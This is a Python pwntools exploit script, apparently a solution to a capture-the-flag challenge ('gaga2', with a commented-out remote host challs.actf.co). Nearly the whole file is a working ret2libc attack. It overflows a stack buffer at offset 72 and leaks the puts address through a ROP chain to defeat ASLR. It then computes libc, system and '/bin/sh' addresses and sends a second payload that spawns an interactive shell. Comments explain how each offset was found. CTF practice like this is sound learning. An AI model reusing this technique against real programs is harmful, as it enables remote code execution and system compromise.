#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
# io = remote('challs.actf.co', 31302)
exe = './gaga2'
io = process(exe)
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'


# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 72

# Got manually through ropper 
pop_rdi = 0x4012b3
ret = 0x40101a

# flattening  payload here
# basically saying at this offset(72)
# inject this list of addresses
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.main
    ]
})

# send 1st payload to get puts offset
io.sendlineafter(b'Your input: ', payload)

# indexing to save puts addr offset in hex form 
got_puts = unpack(io.recvline()[:6].ljust(8, b'\x00'))
info('leaked got_puts: %#x', got_puts)

# OSINT to find all of the potential lib c libraries provided by puts offset
# https://libc.blukat.me
# libc6_2.31-0ubuntu9.9_amd64

# obtained manually using $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
# libc_base = got_puts - 0x77820 #local
libc_base = got_puts - 0x084420  #remote
info('libc_base: %#x', libc_base)

# obtained manually using same method as mentioned above
# system_addr = libc_base + 0x4c330 #local
system_addr = libc_base + 0x052290 #remote
info('system_addr: %#x', system_addr)

# obtained manually using $ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
# binsh = libc_base + 0x196031 #local
binsh = libc_base + 0x1b45bd #remote
info('binsh: %#x', binsh)

# 2nd payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        binsh,
        ret,
        system_addr
    ]
})

# send 2nd payload to get shell
io.sendlineafter(b'Your input: ', payload)

io.interactive()